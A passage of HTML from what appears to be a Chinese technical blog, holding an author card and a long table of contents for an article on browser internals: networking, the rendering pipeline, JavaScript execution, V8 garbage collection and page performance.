id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="https://i.loli.net/2021/06/07/Zpg5K4k9MJcLmI8.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">青山</div><div class="author-info__description">Stay hungry, stay foolish.</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">22</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">18</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">8</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%AE%8F%E8%A7%82%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84%E6%B5%8F%E8%A7%88%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">宏观视角下的浏览器</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%9A%E8%BF%9B%E7%A8%8B%E6%B5%8F%E8%A7%88%E5%99%A8%E6%97%B6%E4%BB%A3"><span class="toc-number">2.1.</span> <span class="toc-text">多进程浏览器时代</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B5%E9%9D%A2%E6%96%87%E4%BB%B6%E5%A6%82%E4%BD%95%E5%AE%8C%E6%95%B4%E9%80%81%E8%BE%BE%E6%B5%8F%E8%A7%88%E5%99%A8%EF%BC%9F"><span class="toc-number">2.2.</span> <span class="toc-text">页面文件如何完整送达浏览器？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#IP%EF%BC%9A%E6%8A%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E9%80%81%E8%BE%BE%E7%9B%AE%E7%9A%84%E4%B8%BB%E6%9C%BA"><span class="toc-number">2.2.1.</span> <span class="toc-text">IP：把数据包送达目的主机</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#UDP%EF%BC%9A%E6%8A%8A%E6%95%B0%E6%8D%AE%E5%8C%85%E9%80%81%E8%BE%BE%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.2.2.</span> <span class="toc-text">UDP：把数据包送达应用程序</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TCP%EF%BC%9A%E6%8A%8A%E6%95%B0%E6%8D%AE%E5%AE%8C%E6%95%B4%E5%9C%B0%E9%80%81%E8%BE%BE%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F"><span class="toc-number">2.2.3.</span> <span class="toc-text">TCP：把数据完整地送达应用程序</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E7%AB%AF%E5%8F%91%E8%B5%B7-HTTP-%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B"><span class="toc-number">2.3.</span> <span class="toc-text">浏览器端发起 HTTP 请求流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA%E8%AF%B7%E6%B1%82"><span class="toc-number">2.3.1.</span> <span class="toc-text">构建请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E7%BC%93%E5%AD%98"><span class="toc-number">2.3.2.</span> <span class="toc-text">查找缓存</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%87%86%E5%A4%87-IP-%E5%9C%B0%E5%9D%80%E5%92%8C%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.3.3.</span> <span class="toc-text">准备 IP 地址和端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AD%89%E5%BE%85-TCP-%E9%98%9F%E5%88%97"><span class="toc-number">2.3.4.</span> <span class="toc-text">等待 TCP 队列</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%BA%E7%AB%8B-TCP-%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.3.5.</span> <span class="toc-text">建立 TCP 连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%91%E9%80%81-HTTP-%E8%AF%B7%E6%B1%82"><span class="toc-number">2.3.6.</span> <span class="toc-text">发送 HTTP 请求</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%A4%84%E7%90%86-HTTP-%E8%AF%B7%E6%B1%82%E6%B5%81%E7%A8%8B"><span class="toc-number">2.4.</span> <span class="toc-text">服务器端处理 HTTP 请求流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%94%E5%9B%9E%E8%AF%B7%E6%B1%82"><span class="toc-number">2.4.1.</span> <span class="toc-text">返回请求</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%AD%E5%BC%80%E8%BF%9E%E6%8E%A5"><span class="toc-number">2.4.2.</span> <span class="toc-text">断开连接</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">2.4.3.</span> <span class="toc-text">重定向</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E8%BE%93%E5%85%A5URL%E5%88%B0%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%EF%BC%8C%E5%8F%91%E7%94%9F%E4%BA%86%E4%BB%80%E4%B9%88%EF%BC%9F%EF%BC%88%E7%BB%8F%E5%85%B8%E9%9D%A2%E8%AF%95%E9%A2%98%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">从输入URL到页面展示，发生了什么？（经典面试题）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5"><span class="toc-number">2.5.1.</span> <span class="toc-text">1.用户输入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-URL%E8%AF%B7%E6%B1%82%E8%BF%87%E7%A8%8B"><span class="toc-number">2.5.2.</span> <span class="toc-text">2.URL请求过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E5%87%86%E5%A4%87%E6%B8%B2%E6%9F%93%E8%BF%9B%E7%A8%8B"><span class="toc-number">2.5.3.</span> <span class="toc-text">3.准备渲染进程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E6%8F%90%E4%BA%A4%E6%96%87%E6%A1%A3"><span class="toc-number">2.5.4.</span> <span class="toc-text">4.提交文档</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E6%B8%B2%E6%9F%93%E9%98%B6%E6%AE%B5"><span class="toc-number">2.5.5.</span> <span class="toc-text">5.渲染阶段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTML%E3%80%81CSS%E5%92%8CJavaScript%EF%BC%8C%E6%98%AF%E5%A6%82%E4%BD%95%E5%8F%98%E6%88%90%E9%A1%B5%E9%9D%A2%E7%9A%84%EF%BC%9F%EF%BC%88%E6%B8%B2%E6%9F%93%E8%BF%9B%E7%A8%8B%EF%BC%89"><span class="toc-number">2.6.</span> <span class="toc-text">HTML、CSS和JavaScript，是如何变成页面的？（渲染进程）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E5%BB%BA-DOM-%E6%A0%91"><span class="toc-number">2.6.1.</span> <span class="toc-text">构建 DOM 树</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%B7%E5%BC%8F%E8%AE%A1%E7%AE%97"><span class="toc-number">2.6.2.</span> <span class="toc-text">样式计算</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B1%80%E9%98%B6%E6%AE%B5"><span class="toc-number">2.6.3.</span> <span class="toc-text">布局阶段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%B1%82"><span class="toc-number">2.6.4.</span> <span class="toc-text">分层</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%BE%E5%B1%82%E7%BB%98%E5%88%B6"><span class="toc-number">2.6.5.</span> <span class="toc-text">图层绘制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A0%85%E6%A0%BC%E5%8C%96%EF%BC%88raster%EF%BC%89%E6%93%8D%E4%BD%9C"><span class="toc-number">2.6.6.</span> <span class="toc-text">栅格化（raster）操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%90%88%E6%88%90%E5%92%8C%E6%98%BE%E7%A4%BA"><span class="toc-number">2.6.7.</span> <span class="toc-text">合成和显示</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E6%B5%81%E6%B0%B4%E7%BA%BF%E5%A4%A7%E6%80%BB%E7%BB%93"><span class="toc-number">2.6.8.</span> <span class="toc-text">渲染流水线大总结</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%A6%82%E5%BF%B5%E2%80%94%E2%80%94%E9%87%8D%E6%8E%92%EF%BC%88%E6%9B%B4%E6%96%B0%E4%BA%86%E5%85%83%E7%B4%A0%E7%9A%84%E5%87%A0%E4%BD%95%E5%B1%9E%E6%80%A7%EF%BC%89"><span class="toc-number">2.6.9.</span> <span class="toc-text">1. 概念——重排（更新了元素的几何属性）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%A6%82%E5%BF%B5%E2%80%94%E2%80%94%E9%87%8D%E7%BB%98%EF%BC%88%E6%9B%B4%E6%96%B0%E5%85%83%E7%B4%A0%E7%9A%84%E7%BB%98%E5%88%B6%E5%B1%9E%E6%80%A7%EF%BC%89"><span class="toc-number">2.6.10.</span> <span class="toc-text">2. 概念——重绘（更新元素的绘制属性）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E6%A6%82%E5%BF%B5%E2%80%94%E2%80%94%E5%90%88%E6%88%90"><span class="toc-number">2.6.11.</span> <span class="toc-text">3. 概念——合成</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84JavaScript%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text">浏览器中的JavaScript执行机制</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">3.1.</span> <span class="toc-text">执行上下文</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8F%90%E5%8D%87%EF%BC%88Hoisting%EF%BC%89"><span class="toc-number">3.2.</span> <span class="toc-text">变量提升（Hoisting）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript-%E4%BB%A3%E7%A0%81%E7%9A%84%E6%89%A7%E8%A1%8C%E6%B5%81%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">JavaScript 代码的执行流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E7%BC%96%E8%AF%91%E9%98%B6%E6%AE%B5"><span class="toc-number">3.3.1.</span> <span class="toc-text">1. 编译阶段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E6%89%A7%E8%A1%8C%E9%98%B6%E6%AE%B5"><span class="toc-number">3.3.2.</span> <span class="toc-text">2. 执行阶段</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%A3%E7%A0%81%E4%B8%AD%E5%87%BA%E7%8E%B0%E7%9B%B8%E5%90%8C%E7%9A%84%E5%8F%98%E9%87%8F%E6%88%96%E8%80%85%E5%87%BD%E6%95%B0%E6%80%8E%E4%B9%88%E5%8A%9E%EF%BC%9F"><span class="toc-number">3.4.</span> <span class="toc-text">代码中出现相同的变量或者函数怎么办？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88JavaScript%E4%BB%A3%E7%A0%81%E4%BC%9A%E5%87%BA%E7%8E%B0%E6%A0%88%E6%BA%A2%E5%87%BA%EF%BC%9F"><span class="toc-number">3.5.</span> <span class="toc-text">为什么JavaScript代码会出现栈溢出？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8"><span class="toc-number">3.5.1.</span> <span class="toc-text">什么是函数调用</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#V8%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86"><span class="toc-number">4.</span> <span class="toc-text">V8工作原理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%95%B0%E6%8D%AE%E5%9C%A8%E5%86%85%E5%AD%98%E4%B8%AD%E7%9A%84%E5%AD%98%E6%94%BE"><span class="toc-number">4.1.</span> <span class="toc-text">数据在内存中的存放</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript-%E7%9A%84%E8%AF%AD%E8%A8%80%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.1.1.</span> <span class="toc-text">JavaScript 的语言类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript-%E7%9A%84%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B"><span class="toc-number">4.1.2.</span> <span class="toc-text">JavaScript 的数据类型</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%86%85%E5%AD%98%E7%A9%BA%E9%97%B4"><span class="toc-number">4.1.3.</span> <span class="toc-text">内存空间</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JavaScript-%E5%A4%84%E7%90%86%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6"><span class="toc-number">4.2.</span> <span class="toc-text">JavaScript 处理垃圾回收</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E7%94%A8%E6%A0%88%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E5%9B%9E%E6%94%B6%E7%9A%84"><span class="toc-number">4.2.1.</span> <span class="toc-text">调用栈中的数据是如何回收的</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A0%86%E4%B8%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E6%98%AF%E5%A6%82%E4%BD%95%E5%9B%9E%E6%94%B6%E7%9A%84"><span class="toc-number">4.2.2.</span> <span class="toc-text">堆中的数据是如何回收的</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BB%A3%E9%99%85%E5%81%87%E8%AF%B4%E5%92%8C%E5%88%86%E4%BB%A3%E6%94%B6%E9%9B%86"><span class="toc-number">4.2.2.1.</span> <span class="toc-text">代际假说和分代收集</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8%E7%9A%84%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B"><span class="toc-number">4.2.2.2.</span> <span class="toc-text">垃圾回收器的工作流程</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%AF%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8"><span class="toc-number">4.2.2.3.</span> <span class="toc-text">副垃圾回收器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%BB%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E5%99%A8"><span class="toc-number">4.2.2.4.</span> <span class="toc-text">主垃圾回收器</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%A8%E5%81%9C%E9%A1%BF"><span class="toc-number">4.2.2.5.</span> <span class="toc-text">全停顿</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#V8-%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">4.3.</span> <span class="toc-text">V8 执行代码</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%BC%96%E8%AF%91%E5%99%A8%E5%92%8C%E8%A7%A3%E9%87%8A%E5%99%A8"><span class="toc-number">4.3.1.</span> <span class="toc-text">编译器和解释器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#V8-%E6%98%AF%E5%A6%82%E4%BD%95%E6%89%A7%E8%A1%8C%E4%B8%80%E6%AE%B5-JavaScript-%E4%BB%A3%E7%A0%81%E7%9A%84"><span class="toc-number">4.3.2.</span> <span class="toc-text">V8 是如何执行一段 JavaScript 代码的</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%94%9F%E6%88%90%E6%8A%BD%E8%B1%A1%E8%AF%AD%E6%B3%95%E6%A0%91%EF%BC%88AST%EF%BC%89%E5%92%8C%E6%89%A7%E8%A1%8C%E4%B8%8A%E4%B8%8B%E6%96%87"><span class="toc-number">4.3.2.1.</span> <span class="toc-text">1. 生成抽象语法树（AST）和执行上下文</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%94%9F%E6%88%90%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">4.3.2.2.</span> <span class="toc-text">2. 生成字节码</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">4.3.2.3.</span> <span class="toc-text">3. 执行代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript-%E7%9A%84%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96"><span class="toc-number">4.3.3.</span> <span class="toc-text">JavaScript 的性能优化</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E9%A1%B5%E9%9D%A2"><span class="toc-number">5.</span> <span class="toc-text">浏览器中的页面</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BD%91%E7%BB%9C%E9%9D%A2%E6%9D%BF"><span class="toc-number">5.1.</span> <span class="toc-text">网络面板</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%8E%A7%E5%88%B6%E5%99%A8"><span class="toc-number">5.1.1.</span> <span class="toc-text">1. 控制器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E8%AF%A6%E7%BB%86%E5%88%97%E8%A1%A8"><span class="toc-number">5.1.2.</span> <span class="toc-text">5. 详细列表</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BC%98%E5%8C%96%E6%97%B6%E9%97%B4%E7%BA%BF%E4%B8%8A%E8%80%97%E6%97%B6%E9%A1%B9"><span class="toc-number">5.1.3.</span> <span class="toc-text">优化时间线上耗时项</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%8E%92%E9%98%9F%EF%BC%88Queuing%EF%BC%89%E6%97%B6%E9%97%B4%E8%BF%87%E4%B9%85"><span class="toc-number">5.1.3.1.</span> <span class="toc-text">1. 排队（Queuing）时间过久</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E7%AC%AC%E4%B8%80%E5%AD%97%E8%8A%82%E6%97%B6%E9%97%B4%EF%BC%88TTFB%EF%BC%89%E6%97%B6%E9%97%B4%E8%BF%87%E4%B9%85"><span class="toc-number">5.1.3.2.</span> <span class="toc-text">2. 第一字节时间（TTFB）时间过久</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-Content-Download-%E6%97%B6%E9%97%B4%E8%BF%87%E4%B9%85"><span class="toc-number">5.1.3.3.</span> <span class="toc-text">3. Content Download 时间过久</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DOM-%E6%A0%91"><span class="toc-number">5.2.</span> <span class="toc-text">DOM 树</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF-DOM"><span class="toc-number">5.2.1.</span> <span class="toc-text">什么是 DOM</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-%E6%A0%91%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90"><span class="toc-number">5.2.2.</span> <span class="toc-text">DOM 树如何生成</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#JavaScript-%E6%98%AF%E5%A6%82%E4%BD%95%E5%BD%B1%E5%93%8D-DOM-%E7%94%9F%E6%88%90%E7%9A%84"><span class="toc-number">5.2.3.</span> <span class="toc-text">JavaScript 是如何影响 DOM 生成的</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E6%B5%81%E6%B0%B4%E7%BA%BF"><span class="toc-number">5.3.</span> <span class="toc-text">渲染流水线</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B8%B2%E6%9F%93%E6%B5%81%E6%B0%B4%E7%BA%BF%E8%A7%86%E8%A7%92%E4%B8%8B%E7%9A%84-CSS"><span class="toc-number">5.3.1.</span> <span class="toc-text">渲染流水线视角下的 CSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BD%B1%E5%93%8D%E9%A1%B5%E9%9D%A2%E5%B1%95%E7%A4%BA%E7%9A%84%E5%9B%A0%E7%B4%A0%E4%BB%A5%E5%8F%8A%E4%BC%98%E5%8C%96%E7%AD%96%E7%95%A5"><span class="toc-number">5.3.2.</span> <span class="toc-text">影响页面展示的因素以及优化策略</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%86%E5%B1%82%E5%92%8C%E5%90%88%E6%88%90%E6%9C%BA%E5%88%B6"><span class="toc-number">5.4.</span> <span class="toc-text">分层和合成机制</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%98%BE%E7%A4%BA%E5%99%A8%E6%98%AF%E6%80%8E%E4%B9%88%E6%98%BE%E7%A4%BA%E5%9B%BE%E5%83%8F%E7%9A%84%EF%BC%9F"><span class="toc-number">5.4.1.</span> <span class="toc-text">显示器是怎么显示图像的？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%A7-VS-%E5%B8%A7%E7%8E%87"><span class="toc-number">5.4.2.</span> <span class="toc-text">帧 VS 帧率</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90%E4%B8%80%E5%B8%A7%E5%9B%BE%E5%83%8F"><span class="toc-number">5.4.3.</span> <span class="toc-text">如何生成一帧图像</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%B1%82%E5%92%8C%E5%90%88%E6%88%90"><span class="toc-number">5.4.3.1.</span> <span class="toc-text">分层和合成</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Chrome-%E5%A6%82%E4%BD%95%E5%AE%9E%E7%8E%B0"><span class="toc-number">5.4.3.2.</span> <span class="toc-text">Chrome 如何实现</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%86%E5%9D%97"><span class="toc-number">5.4.3.3.</span> <span class="toc-text">分块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8%E5%88%86%E5%B1%82%E6%8A%80%E6%9C%AF%E4%BC%98%E5%8C%96%E4%BB%A3%E7%A0%81"><span class="toc-number">5.4.4.</span> <span class="toc-text">如何利用分层技术优化代码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A1%B5%E9%9D%A2%E6%80%A7%E8%83%BD%EF%BC%9A%E5%A6%82%E4%BD%95%E7%B3%BB%E7%BB%9F%E5%9C%B0%E4%BC%98%E5%8C%96%E9%A1%B5%E9%9D%A2%EF%BC%9F"><span class="toc-number">5.5.</span> <span class="toc-text">页面性能：如何系统地优化页面？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E9%98%B6%E6%AE%B5"><span class="toc-number">5.5.1.</span> <span class="toc-text">加载阶段</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%A4%E4%BA%92%E9%98%B6%E6%AE%B5"><span class="toc-number">5.5.2.</span> <span class="toc-text">交互阶段</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%87%8F%E5%B0%91-JavaScript-%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E6%97%B6%E9%97%B4"><span class="toc-number">5.5.2.1.</span> <span class="toc-text">1. 减少 JavaScript 脚本执行时间</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E9%81%BF%E5%85%8D%E5%BC%BA%E5%88%B6%E5%90%8C%E6%AD%A5%E5%B8%83%E5%B1%80"><span class="toc-number">5.5.2.2.</span> <span class="toc-text">2. 避免强制同步布局</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E9%81%BF%E5%85%8D%E5%B8%83%E5%B1%80%E6%8A%96%E5%8A%A8"><span class="toc-number">5.5.2.3.</span> <span class="toc-text">3. 避免布局抖动</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E5%90%88%E7%90%86%E5%88%A9%E7%94%A8-CSS-%E5%90%88%E6%88%90%E5%8A%A8%E7%94%BB"><span class="toc-number">5.5.2.4.</span> <span class="toc-text">4. 合理利用 CSS 合成动画</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#5-%E9%81%BF%E5%85%8D%E9%A2%91%E7%B9%81%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6"><span class="toc-number">5.5.2.5.</span> <span class="toc-text">5. 避免频繁的垃圾回收</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%99%9A%E6%8B%9FDOM%EF%BC%9A%E8%99%9A%E6%8B%9FDOM%E5%92%8C%E5%AE%9E%E9%99%85%E7%9A%84DOM%E6%9C%89%E4%BD%95%E4%B8%8D%E5%90%8C%EF%BC%9F"><span class="toc-number">5.6.</span> <span class="toc-text">虚拟DOM：虚拟DOM和实际的DOM有何不同？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DOM-%E7%9A%84%E7%BC%BA%E9%99%B7"><span class="toc-number">5.6.1.</span> <span class="toc-text">DOM 的缺陷</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%80%E4%B9%88%E6%98%AF%E8%99%9A%E6%8B%9F-DOM"><span class="toc-number">5.6.2.</span> <span class="toc-text">什么是虚拟 DOM</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E5%8F%8C%E7%BC%93%E5%AD%98"><span class="toc-number">5.6.2.1.</span> <span class="toc-text">1. 双缓存</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-MVC-%E6%A8%A1%E5%BC%8F"><span class="toc-number">5.6.2.2.</span> <span class="toc-text">2. MVC 模式</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B8%90%E8%BF%9B%E5%BC%8F%E7%BD%91%E9%A1%B5%E5%BA%94%E7%94%A8%EF%BC%88PWA%EF%BC%89"><span class="toc-number">5.7.</span> <span class="toc-text">渐进式网页应用（PWA）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B5%8F%E8%A7%88%E5%99%A8%E4%B8%AD%E7%9A%84%E7%BD%91%E7%BB%9C"><span class="toc-number">6.</span> <span class="toc-text">浏览器中的网络</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-1%EF%BC%9AHTTP%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96"><span class="toc-number">6.1.</span> <span class="toc-text">HTTP&#x2F;1：HTTP性能优化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%85%E6%96%87%E6%9C%AC%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE-HTTP-0-9"><span class="toc-number">6.1.1.</span> <span class="toc-text">超文本传输协议 HTTP&#x2F;0.9</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A2%AB%E6%B5%8F%E8%A7%88%E5%99%A8%E6%8E%A8%E5%8A%A8%E7%9A%84-HTTP-1-0"><span class="toc-number">6.1.2.</span> <span class="toc-text">被浏览器推动的 HTTP&#x2F;1.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 